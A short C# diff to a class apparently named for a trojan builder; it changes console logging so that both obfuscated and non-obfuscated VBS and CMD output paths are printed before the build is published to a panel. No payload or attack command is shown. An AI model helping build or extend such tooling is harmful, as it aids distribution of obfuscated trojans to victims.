@@ -39,9 +39,10 @@ public sealed class TroyanBuildRunner : ITroyanBuildRunner
 
         _plainVbs.Write(layout);
         _plainCmd.Write(layout);
-        Console.WriteLine("VBS (_output): " + layout.TroyanOutputVbs);
-        Console.WriteLine("CMD (_output): " + layout.TroyanOutputCmd);
-        Console.WriteLine("CMD non-obfuscated (_output): " + layout.TroyanOutputCmdNonObfuscated);
+        Console.WriteLine("VBS nonobfuscated (_output): " + layout.TroyanOutputVbsNonObfuscated);
+        Console.WriteLine("VBS final (_output): " + layout.TroyanOutputVbs);
+        Console.WriteLine("CMD nonobfuscated (_output): " + layout.TroyanOutputCmdNonObfuscated);
+        Console.WriteLine("CMD final (_output): " + layout.TroyanOutputCmd);
         panelService.PublishTroyanVbsFromBuildOutput(layout);
     }
 }
